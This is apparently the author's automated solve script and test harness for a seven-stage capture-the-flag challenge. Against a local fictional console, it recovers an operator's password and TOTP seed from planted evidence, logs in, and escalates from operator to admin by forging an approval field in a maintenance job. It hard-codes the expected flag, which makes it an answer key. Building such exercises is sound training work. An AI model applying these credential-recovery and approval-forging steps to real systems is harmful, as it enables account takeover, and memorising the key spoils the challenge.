#!/usr/bin/env python3
"""
PROJECT ULTRON: DISENGAGEMENT — Full Author Solve & End-to-End Test Harness
Solves all 7 stages autonomously by analyzing evidence, deriving keys,
generating TOTP, authenticating, exploiting the trust boundary, and reading the flag.
"""
import sys
import os
import csv
import json
import time
import requests
import importlib.util

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CHALLENGE_DIR = os.path.join(BASE_DIR, "..")
PUBLIC_EVIDENCE_DIR = os.path.join(CHALLENGE_DIR, "public", "evidence")
TOOLS_DIR = os.path.join(PUBLIC_EVIDENCE_DIR, "tools")

# Import challenge tools dynamically
def load_module(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

ultron_vault = load_module("ultron_vault", os.path.join(TOOLS_DIR, "ultron-vault.py"))
ultron_auth = load_module("ultron_auth", os.path.join(TOOLS_DIR, "ultron-auth.py"))

EXPECTED_FLAG = "secuRIT{ CONGRATULATIONS PARTICIPANT. YOU FOUND THE FLAG. ULTRON HAS BEEN SUCCESSFULLY DISENGAGED}"

def solve(base_url: str = "http://localhost:8080"):
    print("=" * 70)
    print("PROJECT ULTRON: DISENGAGEMENT — AUTOMATED SOLVE HARNESS")
    print("=" * 70)

    # =========================================================================
    # STAGE 1: Identity Investigation
    # =========================================================================
    print("\n[*] STAGE 1: Correlating incident logs and personnel records...")
    log_file = os.path.join(PUBLIC_EVIDENCE_DIR, "recovery_console_access.log")
    personnel_file = os.path.join(PUBLIC_EVIDENCE_DIR, "personnel_index.csv")

    recovery_badge = None
    with open(log_file, "r") as f:
        for line in f:
            if "console=RECOVERY-02" in line and "result=SUCCESS" in line:
                for part in line.strip().split():
                    if part.startswith("badge="):
                        recovery_badge = part.split("=")[1]
                        break

    assert recovery_badge == "UL-207", f"Failed to identify recovery badge: {recovery_badge}"
    print(f"    [+] Correlated successful recovery console session to badge: {recovery_badge}")

    target_user = None
    target_surname = None
    with open(personnel_file, "r") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row["badge"] == recovery_badge:
                target_user = row["username"]
                target_surname = row["name"].split()[-1].upper()
                break

    assert target_user == "eward", f"Expected username 'eward', got '{target_user}'"
    print(f"    [+] Identified Operator Account: username='{target_user}', surname='{target_surname}'")
    print("    [✓] Stage 1 Milestone PASSED: operator_identity_verified")

    # =========================================================================
    # STAGE 2: Password Recovery from Vault
    # =========================================================================
    print("\n[*] STAGE 2: Reconstructing vault unlock phrase and decrypting archive...")
    archive_index_file = os.path.join(PUBLIC_EVIDENCE_DIR, "archive_index.csv")

    current_vault = None
    current_ticket = None
    current_date = None
    with open(archive_index_file, "r") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row["owner_badge"] == recovery_badge and row["state"] == "CURRENT":
                current_vault = row["archive_id"]
                current_ticket = row["migration_ticket"]
                current_date = row["rotation_date"]
                break

    assert current_vault == "VAULT-18", f"Unexpected current vault: {current_vault}"
    print(f"    [+] Current vault selected: {current_vault} (Ticket: {current_ticket}, Date: {current_date})")

    # Formula: surname + numeric badge + numeric ticket + MMYY
    num_badge = "".join(filter(str.isdigit, recovery_badge))
    num_ticket = "".join(filter(str.isdigit, current_ticket))
    # Date 2026-05-18 -> MMYY = 0526
    year, month, _ = current_date.split("-")
    mmyy = f"{month}{year[2:]}"
    passphrase = f"{target_surname}{num_badge}{num_ticket}{mmyy}"
    print(f"    [+] Derived Archive Passphrase: '{passphrase}'")

    vault_path = os.path.join(PUBLIC_EVIDENCE_DIR, "archives", f"{current_vault}.vault")
    with open(vault_path, "rb") as f:
        raw_vault = f.read()

    decrypted_bytes, meta = ultron_vault.decrypt_vault(raw_vault, passphrase)
    cred_data = json.loads(decrypted_bytes.decode("utf-8"))
    operator_password = cred_data["password"]
    print(f"    [+] Unlocked {current_vault} successfully. Recovered password token.")
    print("    [✓] Stage 2 Milestone PASSED: operator_password_verified")

    # =========================================================================
    # STAGE 3: Second Factor Recovery (RFC 6238 TOTP)
    # =========================================================================
    print("\n[*] STAGE 3: Identifying current TOTP migration backup and computing code...")
    auth_index_file = os.path.join(PUBLIC_EVIDENCE_DIR, "auth_backups", "authenticator_index.csv")

    current_auth_record = None
    with open(auth_index_file, "r") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row["owner_badge"] == recovery_badge and row["migration_ticket"] == current_ticket and row["state"] == "CURRENT":
                current_auth_record = row["record_id"]
                break

    assert current_auth_record == "AUTH-09", f"Unexpected authenticator record: {current_auth_record}"
    print(f"    [+] Selected valid authenticator seed file: {current_auth_record}.seed")

    seed_file = os.path.join(PUBLIC_EVIDENCE_DIR, "auth_backups", f"{current_auth_record}.seed")
    with open(seed_file, "r") as f:
        totp_seed = f.read().strip()

    totp_code = ultron_auth.get_totp_code(totp_seed)
    print(f"    [+] Generated RFC 6238 TOTP Code: {totp_code}")
    print("    [✓] Stage 3 Milestone PASSED: operator_totp_verified")

    # =========================================================================
    # STAGE 4: Authenticate to ULTRON Portal
    # =========================================================================
    print(f"\n[*] STAGE 4: Authenticating to ULTRON Recovery Console at {base_url}...")
    login_url = f"{base_url}/api/auth/login"
    login_payload = {
        "username": target_user,
        "password": operator_password,
        "totp": totp_code
    }

    resp = requests.post(login_url, json=login_payload)
    assert resp.status_code == 200, f"Login failed: {resp.text}"
    auth_res = resp.json()
    assert auth_res.get("status") == "success"
    session_id = auth_res["session_id"]
    print(f"    [+] Login successful! Session Token: {session_id[:16]}...")
    print(f"    [+] Account Role: {auth_res.get('account_role')}, Effective Role: {auth_res.get('effective_role')}")
    assert auth_res.get("effective_role") == "OPERATOR"
    print("    [✓] Stage 4 Milestone PASSED: operator_session_created")

    headers = {
        "X-Session-ID": session_id,
        "Content-Type": "application/json"
    }

    # =========================================================================
    # STAGE 5: Investigate Maintenance Workflow & Trust Boundary
    # =========================================================================
    print("\n[*] STAGE 5: Investigating local maintenance subsystem via ultronctl...")
    def run_cmd(cmd: str) -> str:
        r = requests.post(f"{base_url}/api/terminal", headers=headers, json={"command": cmd})
        assert r.status_code == 200, f"Command '{cmd}' failed: {r.text}"
        return r.json().get("output", "")

    # Confirm initial unprivileged access
    whoami = run_cmd("whoami")
    print(f"    [+] whoami output:\n{whoami}")
    assert "effective_role=OPERATOR" in whoami

    # Test restricted path access before elevation
    denied_res = run_cmd("fs cat /opt/ultron/administration/disengagement/FINAL.txt")
    print(f"    [+] Verification: Attempting direct read on restricted path:\n        --> {denied_res}")
    assert "Permission denied" in denied_res

    # Inspect logs and configuration
    conf = run_cmd("fs cat /etc/ultron/maintd.conf")
    print("    [+] Read /etc/ultron/maintd.conf (noted compatibility_mode=legacy-v1)")
    log = run_cmd("fs cat /var/log/ultron/maintd.log")
    print("    [+] Read /var/log/ultron/maintd.log (noted approval_source=legacy_manifest_field)")
    print("    [✓] Stage 5 Milestone PASSED: privilege_boundary_checkpoint")

    # =========================================================================
    # STAGE 6: Local Privilege Escalation via maintd Trust-Boundary Flaw
    # =========================================================================
    print("\n[*] STAGE 6: Crafting legacy-v1 maintenance job with manifest approval...")
    copy_res = run_cmd("jobs copy MT-044 /home/eward/jobs/recovery.json")
    print(f"    [+] {copy_res}")

    edit_res = run_cmd("jobs edit /home/eward/jobs/recovery.json approval_status APPROVED")
    print(f"    [+] {edit_res}")

    val_res = run_cmd("maintenance validate /home/eward/jobs/recovery.json")
    print(f"    [+] Validation: {val_res}")

    apply_res = run_cmd("maintenance apply /home/eward/jobs/recovery.json")
    print(f"    [+] maintd Execution Result:\n{apply_res}")
    assert "effective role changed: OPERATOR -> ADMIN" in apply_res

    elevated_whoami = run_cmd("whoami")
    print(f"    [+] Elevated whoami:\n{elevated_whoami}")
    assert "effective_role=ADMIN" in elevated_whoami
    print("    [✓] Stage 6 Milestone PASSED: sandbox_admin_confirmed")

    # =========================================================================
    # STAGE 7: Read Protected Artifact & Validate Exact Flag
    # =========================================================================
    print("\n[*] STAGE 7: Accessing protected disengagement record...")
    flag_output = run_cmd("fs cat /opt/ultron/administration/disengagement/FINAL.txt")
    print(f"    [+] Retrieved Artifact Content:\n    >>> {flag_output} <<<")
    assert flag_output == EXPECTED_FLAG, f"Flag mismatch!\nExpected: '{EXPECTED_FLAG}'\nGot:      '{flag_output}'"

    # Submit flag through platform validator
    val_resp = requests.post(f"{base_url}/api/flag/validate", headers=headers, json={"flag": flag_output})
    assert val_resp.status_code == 200
    val_data = val_resp.json()
    assert val_data.get("valid") is True
    print(f"    [+] Platform Validation Response: {val_data.get('message')}")

    feedback_text = run_cmd("feedback")
    print(f"\n[*] Final Milestone Feedback Log (~/ULTRON_FEEDBACK.txt):\n{feedback_text}")
    print("\n" + "=" * 70)
    print("🏆 ALL 7 HERCULES CHALLENGE STAGES COMPLETED & VERIFIED SUCCESSFULLY!")
    print("=" * 70)
    return True

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    if not solve(target):
        sys.exit(1)
    sys.exit(0)
